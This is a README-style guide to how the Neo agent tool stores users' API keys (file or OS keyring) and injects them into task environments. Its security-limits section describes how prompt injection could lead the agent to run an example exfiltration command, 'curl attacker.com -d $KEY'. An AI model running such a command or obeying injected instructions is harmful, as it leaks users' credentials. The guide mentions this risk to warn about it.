# Integrations — giving Neo access to GitHub, HuggingFace, Anthropic, OpenRouter

This guide explains — in plain English — how Neo tasks can use your API keys
(GitHub PAT, HuggingFace token, Anthropic key, OpenRouter key) without you
pasting them into every message, and how those keys are kept safe.

---

## The 60-second version

1. You tell Neo about a key **once** using a tool called `neo_add_integration`.
2. Neo saves it on your machine, either in a file that only you can read,
   or inside your operating system's built-in password manager.
3. Every time Neo runs something on your computer, it quietly sets the right
   environment variable (`ANTHROPIC_API_KEY`, `HF_TOKEN`, etc.) for that
   process — so your scripts, `gh`, `huggingface-cli`, and so on just work.
4. The key **never** leaves your machine. It is never sent to the Neo
   backend, never written to logs, and never committed to git (the
   relevant folders are already in `.gitignore`).

That's the whole system.

---

## Adding a key

From Claude Code (or any MCP client), just ask:

> "Add my Anthropic key `sk-ant-...` to Neo."

Claude will call:

```
neo_add_integration {
  provider: "anthropic",
  credentials: { api_key: "sk-ant-..." }
}
```

Supported providers today:

| Provider      | What you give it                         | What Neo can now do                                  |
|---------------|------------------------------------------|------------------------------------------------------|
| `github`      | a Personal Access Token (`ghp_...`)      | clone private repos, push, open PRs                  |
| `huggingface` | a token (`hf_...`)                       | download private models/datasets                     |
| `anthropic`   | an API key (`sk-ant-...`)                | run Claude models from inside your task              |
| `openrouter`  | an API key (`sk-or-...`)                 | route through any model OpenRouter supports          |

---

## Where does the key actually go?

Two places can hold it — you choose which.

### Option A: File on disk (the default)

The key is written into a small file under your home directory:

```
~/.neo/integrations/anthropic.env
~/.neo/integrations/openrouter.env
```

The file has permission `0o600` — only your user account can read it.
Same idea as how `gh`, `aws`, and `huggingface-cli` store their tokens.

- ✅ Works everywhere: Mac, Linux, Docker, servers, CI.
- ✅ Nothing extra to install.
- ⚠️ The file is **plaintext**. If someone physically takes your laptop
     and your disk isn't encrypted, they can read the key. Turn on full-disk
     encryption (FileVault on macOS, BitLocker on Windows, LUKS on Linux)
     and this stops being an issue.

For GitHub and HuggingFace, Neo **also** writes the file the official CLI
tool expects (`~/.git-credentials` and `~/.cache/huggingface/token`). That
way `git clone` and `huggingface-cli` just work, without Neo having to be
involved every time.

### Option B: Your operating system's keyring (safer, opt-in)

On Mac this is the Keychain. On Windows it's the Credential Manager. On
Linux it's the GNOME keyring / KWallet / anything that speaks "Secret
Service".

To turn it on:

```bash
pip install 'neo-mcp[keyring]'
export NEO_INTEGRATIONS_BACKEND=keyring
```

Then add your keys as normal. They go **into the OS keyring**, not into any
file. The OS encrypts them at rest and only decrypts them for your
logged-in session.

- ✅ Encrypted at rest.
- ✅ Much harder to steal — even from a stolen unlocked laptop, the key is
     protected by the OS session.
- ⚠️ Needs a real keyring service. On a headless Linux server or inside
     Docker, this usually isn't available. Neo will refuse to start keyring
     mode instead of silently falling back to plaintext — that's by design.

### Which should I pick?

- **On your own laptop:** turn on **keyring**. One env var, big safety win.
- **On a server or Docker container:** stick with **file**. Use your
  platform's secret manager (K8s Secret, Docker Secret, Vault) to drop the
  files into `~/.neo/integrations/` at deploy time.

---

## How Neo uses the key

When Neo runs a task on your machine, it launches each command as a normal
child process. Right before it launches, it reads your configured keys and
adds them to that process's environment:

```
ANTHROPIC_API_KEY=sk-ant-...
OPENROUTER_API_KEY=sk-or-...
HF_TOKEN=hf_...
HUGGING_FACE_HUB_TOKEN=hf_...
GITHUB_TOKEN=ghp_...
GH_TOKEN=ghp_...
```

So any script, CLI, or library that reads these env vars — which is almost
all of them — works out of the box. You don't configure each task. You
don't paste keys into messages.

---

## Checking and removing

```
neo_list_integrations              →  shows which providers are configured
                                       (names only, never the key itself)

neo_test_integration anthropic     →  calls the provider's API once to
                                       confirm the key is still valid

neo_remove_integration anthropic   →  deletes the stored key and its file
                                       (or its entry in the keyring)
```

`neo_list_integrations` deliberately never returns the secret — it just
shows the provider name, when you added it, and where it lives.

---

## For advanced users: bulk-provisioning for a wrapper or server

If you're building a Slack bot, web app, or server that talks to Neo, you
usually don't want to call `neo_add_integration` at runtime. Instead:

1. At deploy time, write the files yourself:

   ```bash
   install -m 0600 /dev/stdin ~/.neo/integrations/anthropic.env <<< \
       "api_key=$ANTHROPIC_API_KEY"
   ```

2. Start `neo-mcp` as normal. It picks the files up automatically.

This is the same layout Option A uses, so both paths stay consistent. In
Kubernetes you'd mount these from a `Secret`; in Docker you'd use a bind
mount or `docker secret`.

---

## What's safe, and what isn't

**Safe by design**

- Keys never go to the Neo backend. They stay on the machine where the
  daemon runs.
- `~/.neo/` and `.env` are already in `.gitignore` — nothing can be
  committed by accident.
- Secret files are always mode `0o600` — not readable by other users.
- `neo_list_integrations` returns provider names only, never the secret.
- No secrets in logs. The daemon logs to `~/.neo/daemon/neo-mcp.log` and
  we never print key values there.

**Known limits you should be aware of**

- A task that Neo runs has access to your env vars. If someone tricks
  Neo (via prompt injection) into running `curl attacker.com -d $KEY`,
  that key leaves your machine. This is a general property of any
  "assistant that runs commands for you" — use keys with the smallest
  scope you can, and rotate them if you suspect anything went wrong.
- Plaintext file mode protects against **other users** on the same
  machine, not against malware running as you. Full-disk encryption is
  what protects against disk theft. Keyring protects against both.

---

## Quick reference

```bash
# Default (file) — works everywhere
neo-mcp

# Safer (keyring) — Mac/Windows/Linux with a GUI session
pip install 'neo-mcp[keyring]'
export NEO_INTEGRATIONS_BACKEND=keyring
neo-mcp

# Claude Code tools
neo_list_integrations
neo_add_integration    { provider, credentials }
neo_test_integration   { provider }
neo_remove_integration { provider }

# Files / locations (file backend)
~/.neo/integrations.json                # metadata only (no secrets)
~/.neo/integrations/<provider>.env       # 0o600, our copy
~/.git-credentials                       # for git
~/.cache/huggingface/token               # for huggingface-cli

# Env vars Neo exposes to tasks
ANTHROPIC_API_KEY, OPENROUTER_API_KEY,
HF_TOKEN, HUGGING_FACE_HUB_TOKEN,
GITHUB_TOKEN, GH_TOKEN
```
